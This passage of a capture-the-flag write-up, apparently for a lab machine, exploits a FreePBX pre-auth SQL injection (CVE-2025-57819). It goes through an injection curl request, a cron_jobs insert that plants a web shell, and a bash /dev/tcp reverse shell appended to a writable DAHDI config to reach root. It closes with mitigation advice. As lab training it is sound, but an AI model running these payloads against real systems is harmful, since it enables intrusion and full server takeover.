## Step 2 - Initial Foothold

### FreePBX Pre-Auth SQL Injection (CVE-2025-57819)

Researching FreePBX 16.0.40.7 reveals **CVE-2025-57819**: *Pre-Auth SQL Injection in the Endpoint Manager (`endpoint`) module leading to Remote Code Execution*.

#### Vulnerability Analysis:
The Endpoint Manager module exposes an unauthenticated AJAX endpoint at `/admin/ajax.php`. Due to missing input validation and parameterized query enforcement, user-supplied parameters (`brand`, `template`, `model`) are concatenated directly into SQL query strings.

We verify the vulnerability by triggering an error-based SQL injection using MySQL's `EXTRACTVALUE()` function:

```bash
curl -i -k "https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"
```

```text
HTTP/1.1 500 Internal Server Error
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
Content-Type: application/json

{"error":{"type":"Exception","message":"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~USER:freepbxuser@localhost~'::","file":"/var/www/html/admin/libraries/utility.functions.php","line":123}}
```

> ⚠️ **Technical Detail - Why Did the Database Evaluate the Subquery First?**  
> Under MySQL's query execution order, expression arguments must be evaluated before the enclosing function can be called. The engine resolves `(SELECT USER())` into `freepbxuser@localhost`, concatenates it into `'~USER:freepbxuser@localhost~'`, and only then invokes `EXTRACTVALUE(1, ...)`. Because the tilde (`~`) is invalid in XPath grammar, the engine raises error 1105—exposing our evaluated query output in the error message!

### Transitioning from SQL Injection to Remote Code Execution

In FreePBX, scheduled maintenance tasks are managed through the **`cron_jobs`** table in the `asterisk` database. The master FreePBX daemon periodically polls this table and executes active entries with system privileges.

Because the endpoint supports stacked queries (or multiple statements via SQL injection), we can directly inject an `INSERT INTO cron_jobs` statement:

```sql
INSERT INTO cron_jobs (modulename, jobname, command, class, schedule, max_runtime, enabled, execution_order)
VALUES ('sysadmin', 'watchTowr-[suffix]', 'echo "<BASE64_WEBSHELL>" | base64 -d > /var/www/html/shell-[suffix].php', NULL, '* * * * *', 30, 1, 1);
```

Within 60 seconds, the FreePBX cron daemon triggers the scheduled job and deploys our web shell directly into the document root (`/var/www/html/`).

## Step 3 - Privilege Escalation to Root

### DAHDI Service Architecture & Spool File Abuse

Enumerating running services and administrative automation scripts on the host, we discover that the FreePBX sysadmin daemon manages telephony hardware using **DAHDI** (Digium/Asterisk Hardware Device Interface).

Specifically, the root daemon monitors a spool trigger file:

```text
/var/spool/asterisk/sysadmin/dahdi_restart
```

When this file is modified or touched, the root-level background process triggers a restart of the DAHDI service. To configure the hardware parameters during restart, the daemon sources the shell script configuration file located at:

```text
/etc/dahdi/init.conf
```

Let's check permissions on `/etc/dahdi/init.conf`:

```bash
[asterisk@connected html]$ ls -la /etc/dahdi/init.conf
-rw-rw-r-- 1 root asterisk 1420 Jun 11 12:00 /etc/dahdi/init.conf
```

> ⚠️ **Technical Detail:**  
> The file `/etc/dahdi/init.conf` is group-writable by `asterisk` (`-rw-rw-r--`)! Because the root sysadmin service executes this script directly as a shell configuration file upon receiving the `dahdi_restart` trigger, modifying `init.conf` grants immediate arbitrary code execution as root.

---

### Triggering Root Code Execution

We append a background reverse shell one-liner to `/etc/dahdi/init.conf`:

```bash
echo -e '\n#\nbash -i >& /dev/tcp/10.10.14.70/4446 0>&1 &\n#' >> /etc/dahdi/init.conf
```

Start a netcat listener on port 4446:

```bash
nc -lvnp 4446
```

Now, touch the trigger spool file:

```bash
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

Within seconds, the background root daemon detects the spool trigger, evaluates `/etc/dahdi/init.conf`, and executes our payload:

```text

connect to [10.10.14.70] from (UNKNOWN) [10.129.9.164] 59398
```

Root shell achieved and machine fully compromised!

## Step 5 - Mitigations & Defensive Hardening

To remediate the vulnerabilities identified across the Connected environment, system administrators should implement defense-in-depth controls across web interfaces, database permissions, and local daemon architectures:

### 1. FreePBX Endpoint Manager SQL Injection (CVE-2025-57819)
- **Parameterized Query Enforcement:** Ensure all AJAX handler methods in `/admin/ajax.php` use prepared PDO statements with bound parameters (`$stmt->prepare()`) rather than string concatenation.
- **Enforce Module Authentication:** Restrict access to `ajax.php` handlers requiring active session authentication. Prohibit unauthenticated access to module commands.
- **Upgrade FreePBX:** Upgrade FreePBX and the Endpoint Manager module to the latest official release where input validation has been remediated.

### 2. Database Least Privilege & Cron Table Protection
- **Restrict Web Application Database Permissions:** The database user utilized by the web interface (`freepbxuser`) should not possess unrestricted `INSERT` or `UPDATE` privileges over administrative scheduling tables (`cron_jobs`).
- **Separate Web and Administrative Databases:** Isolate system administration and cron execution tables from the standard telephony user tables to mitigate privilege escalation via stacked SQL injection.

### 3. File Permissions & Daemon Spooler Hardening
- **Remove Group-Write Privileges on System Configurations:** `/etc/dahdi/init.conf` and similar service configuration files sourced by root must be owned strictly by `root:root` with permissions `0644`. Standard service accounts like `asterisk` must never hold write rights over configuration files executed by root daemons.
- **Sanitize Environment Variables in Startup Scripts:** Root daemons monitoring spool directories (`/var/spool/asterisk/sysadmin/`) should avoid sourcing raw shell configuration files; instead, parse structured key-value configurations (like YAML or INI) without executing code.
